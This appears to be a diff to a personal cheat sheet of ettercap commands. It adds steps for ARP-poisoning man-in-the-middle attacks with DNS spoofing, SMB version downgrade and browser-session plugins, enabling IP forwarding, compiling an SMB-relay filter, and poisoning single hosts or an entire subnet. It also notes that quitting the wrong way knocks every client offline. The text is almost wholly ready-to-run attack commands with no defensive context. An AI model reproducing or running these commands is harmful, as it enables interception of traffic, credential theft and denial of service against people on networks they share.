@@ -4,6 +4,7 @@ the "arp:remote" specifies the type of MITM attack (arp posioning and sniff remo
 ettercap -T -M arp:remote /host/ /gateway/ -P dns_spoof -P smb_down -P autoadd -P remote_browser
 
 
+smb_down: downgrade SMB version
 
 **************************************************************************
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -18,4 +19,22 @@ ec_gid = 0
 
 quiting ettercap press "q" key not ctrl+c.
 
+**************************************************************************
+
 When quiting ettercap, make sure to press the letter "q", instead of the typical "Ctrl+C", because that will Re-ARP all the clients, If you simply press "Ctrl+C", then there will be a massive DoS, and no clients will have the internet or network access until they refresh their network position.
+
+
+
+If get error message like:
+SEND L3 ERROR: 1500 byte packet destined to XXX.XXX.XXX.XXX was not forward...
+
+then you must be sure the forward options already activated.
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+
+etterfilter smbrelay.filter -o smbrelay.ef
+
+ettercap -T -q -F smbrelay.ef -M arp /host/ /gateway/
+or
+ettercap -T -q -F smbrelay.ef -M arp // //
